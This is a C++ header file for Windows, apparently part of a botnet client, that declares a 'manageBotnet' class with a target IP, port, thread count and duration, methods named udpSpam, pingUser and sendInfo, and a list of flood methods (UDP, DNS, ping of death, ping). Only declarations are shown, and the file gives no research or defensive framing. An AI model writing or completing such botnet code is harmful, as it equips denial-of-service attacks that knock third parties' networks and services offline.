#ifndef ATTACK_H
#define ATTACK_H


#pragma once

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <string>
#include <iostream>
#include <format>
#include <nlohmann/json.hpp>
#include <thread>
#include <regex>
#include <WinSock2.h>


class manageBotnet {
private:
    SOCKET sock_;
    struct sockaddr_in servaddr, cliaddr;
    int connfd, clilen, port_, time, thread, serverPort;
    char buffer[1024];
    std::string method, ip, serverIp;

public:
    manageBotnet(int port, std::string ip, std::string method, int thread, int time);
    void udpSpam();
    void pingUser();
    void sendInfo(nlohmann::json jsonData);
};

const struct methodAttack{
    std::string UDP = "UDP";
    std::string DNS = "DNS";
    std::string POD = "POD";
    std::string PING = "PING";
};


void error(std::string head, std::string body);
void errorNotStop(std::string head, std::string body);

#endif